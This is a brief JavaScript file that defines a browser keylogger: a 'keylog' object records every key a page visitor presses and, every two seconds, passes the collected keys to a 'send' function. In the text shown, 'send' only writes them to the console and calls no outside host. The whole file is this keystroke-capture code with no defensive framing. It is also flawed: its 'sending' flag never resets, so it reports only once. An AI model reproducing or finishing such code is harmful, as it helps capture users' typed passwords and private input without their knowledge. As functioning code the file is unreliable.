var keylog = {
    cache: [], delay: 2000, sending: false,
    init: function () {
        //addEventListener for adding event handler to the Webpage
        try
        {
            window.addEventListener("keydown", function (evt) {
                keylog.cache.push(evt.key); });
            //Set Interval for periodically calling the send function
            window.setInterval(keylog.send, keylog.delay); 
        }
        catch(err){
            console.log(err.message);
        }
    },
    send: function () {
        try{
            if (!keylog.sending && keylog.cache.length != 0) {
                keylog.sending = true;        
                console.log(keylog.cache);
                keylog.cache = [];
            }
        }
        catch(err){
            console.log(err.message);
        }
    }
};
window.addEventListener("DOMContentLoaded", keylog.init);